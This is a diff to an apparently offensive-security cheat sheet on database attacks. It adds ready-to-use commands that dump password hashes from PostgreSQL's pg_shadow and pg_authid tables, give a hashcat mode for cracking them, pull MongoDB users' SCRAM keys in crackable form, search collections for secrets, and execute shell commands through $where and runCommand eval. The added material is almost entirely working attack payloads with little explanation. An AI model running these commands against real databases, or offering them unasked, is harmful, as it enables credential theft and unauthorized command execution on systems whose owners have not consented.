@@ -116,6 +116,10 @@ pagetitle: Database Attacks
 - Use `psql -U {username}` for to connect to PostgreSQL databases (with `-d {db_name}` for a database)
   - Then, we can list databases with `\l` and use `\c {db_name}` to connect to the database
   - `\d` to list the tables once connected
+- Yoink hashes
+  - `SELECT usename, passwd FROM pg_shadow;`
+  - `SELECT * FROM pg_authid;`
+  - Crack with `-m 28600` on hashcat
 - Command execution with `COPY (SELECT '') TO PROGRAM 'bash -c "whoami"';`
 	- Requires superuser
 - Command execution with `SELECT pg_execute_server_program('id');`
@@ -133,3 +137,32 @@ pagetitle: Database Attacks
 - Dumping MongoDB: `mongodump --host [host] --port [port] --username [user] --password [password] --out ./mongodb_dump`
 - Connecting to a MongoDB: use `mongosh` or `mongo`
   - `mongo --host {IP}:{port} -u {username} -p {password} --authenticationDatabase {database_with_auth_info} ({database_to_use})`
+- Get user hashes and format for cracking:
+```
+use admin
+db.system.users.find().forEach(function(u) {
+    print(u.user + ":" + u.credentials["SCRAM-SHA-1"].storedKey);
+})
+```
+- Search for sensitive info:
+```
+db.getCollectionNames().filter(c => 
+    c.match(/user|password|credential|token|key|secret|admin/i)
+)
+```
+- Command execution with `db.collection.find({$where: "{command} || true"})`
+- Alternatively:
+```
+db.collection.find({$where: function() {
+    var cmd = "whoami";
+    var output = run("bash", "-c", cmd);
+    return true;
+}})
+```
+- Can also try `runCommand()`
+```
+db.runCommand({
+    eval: "function() { return run('whoami'); }",
+    nolock: true
+})
+```
